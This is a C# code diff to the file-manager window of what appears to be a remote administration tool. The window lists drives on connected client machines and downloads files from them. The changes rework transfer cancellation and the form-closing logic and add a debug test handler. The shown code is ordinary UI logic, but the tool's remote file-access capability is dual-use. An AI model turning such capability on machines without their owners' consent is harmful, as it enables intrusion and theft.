@@ -15,7 +15,8 @@ namespace Serveur.Views
         private readonly ClientMosaic _client;
         private string _currentDir;
         private static readonly Random _rnd = new Random(Environment.TickCount);
-        private const int TRANSFER_STATUS = 3;
+        private const int TRANSFER_STATUS = 2;
+        private const int TRANSFER_TYPE = 1;
         private const int TRANSFER_ID = 0;
 
         public FrmFileManager(ClientMosaic client)
@@ -30,6 +31,42 @@ namespace Serveur.Views
         private void FrmFileManager_Load(object sender, EventArgs e)
         {
             new GetDrives().Execute(_client);
+        }
+
+        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (_client.value != null)
+            {
+
+                foreach (ListViewItem transfer in lvTransfers.Items)
+                {
+                    if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
+                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
+                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;
+
+                    int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);
+
+                    if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
+                    {
+                        if (_client != null)
+                            new DoDownloadFileCancel(id).Execute(_client);
+                        if (!canceledDownloads.ContainsKey(id))
+                            canceledDownloads.Add(id, "canceled");
+                        if (renamedFiles.ContainsKey(id))
+                            renamedFiles.Remove(id);
+                        updateTransferStatus(transfer.Index, "Canceled", 0);
+                    }
+                    else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
+                    {
+                        //if (!CanceledUploads.ContainsKey(id))
+                        //    CanceledUploads.Add(id, "canceled");
+                        //UpdateTransferStatus(transfer.Index, "Canceled", 0);
+                    }
+                }
+
+
+                _client.value.frmFm = null;
+            }
         }
 
         public void addDrives(RemoteDrive[] drives)
@@ -205,22 +242,25 @@ namespace Serveur.Views
 
                     if(_client  != null)
                     {
-                        int i = lvTransfers.Items.Count;
+                        new DoDownloadFile(path, uniqId).Execute(_client);
 
-                        new DoDownloadFile(path, uniqId, i).Execute(_client);
-
-                        addTransfer(uniqId, i, "Download", "Pending...", files.SubItems[0].Text);
+                        addTransfer(uniqId, "Download", "Pending...", files.SubItems[0].Text);
                     }
                 }
             }
         }
 
-        public void addTransfer(int uniqId, int lvItem, string type, string status, string filename)
+        public static int getNewTransferId(int o = 0)
+        {
+            return _rnd.Next(0, int.MaxValue) + o;
+        }
+
+        public void addTransfer(int uniqId, string type, string status, string filename)
         {
             try
             {
                 ListViewItem lvi =
-                  new ListViewItem(new string[] {uniqId.ToString(), lvItem.ToString(), type, status, filename });
+                  new ListViewItem(new string[] {uniqId.ToString(), type, status, filename });
 
                 lvDirectory.Invoke((MethodInvoker)delegate
                 {
@@ -232,12 +272,8 @@ namespace Serveur.Views
             }
         }
 
-        public static int getNewTransferId(int o = 0)
-        {
-            return _rnd.Next(0, int.MaxValue) + o;
-        }
 
-        public void updateTransferStatus(int lvItem, int index, string status, int imageIndex)
+        public void updateTransferStatus(int index, string status, int imageIndex)
         {
             try
             {
@@ -245,7 +281,7 @@ namespace Serveur.Views
                 {
                     lvTransfers.Invoke((MethodInvoker)delegate
                     {
-                        lvTransfers.Items[lvItem].SubItems[TRANSFER_STATUS].Text = status;
+                        lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                     });
 
                 });
@@ -282,15 +318,40 @@ namespace Serveur.Views
             return index;
         }
 
-        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            if (_client.value != null)
-                _client.value.frmFm = null;
-        }
-
         private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            new DoDownloadFileCancel(125, 250).Execute(_client);
+            foreach (ListViewItem transfer in lvTransfers.SelectedItems)
+            {
+                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
+                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
+                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;
+
+                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);
+
+                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
+                {
+                    if (_client != null)
+                        new DoDownloadFileCancel(id).Execute(_client);
+                    if (!canceledDownloads.ContainsKey(id))
+                            canceledDownloads.Add(id, "canceled");
+                    if (renamedFiles.ContainsKey(id))
+                        renamedFiles.Remove(id);
+                    updateTransferStatus(transfer.Index, "Canceled", 0);
+                }
+                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
+                {
+                    //if (!CanceledUploads.ContainsKey(id))
+                    //    CanceledUploads.Add(id, "canceled");
+                    //UpdateTransferStatus(transfer.Index, "Canceled", 0);
+                }
+            }
+        }
+
+        private void testToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            //_client.value.ttttest = true;
+            MessageBox.Show("salut");
+            new DoDownloadFileCancel(41).Execute(_client);
         }
     }
 }
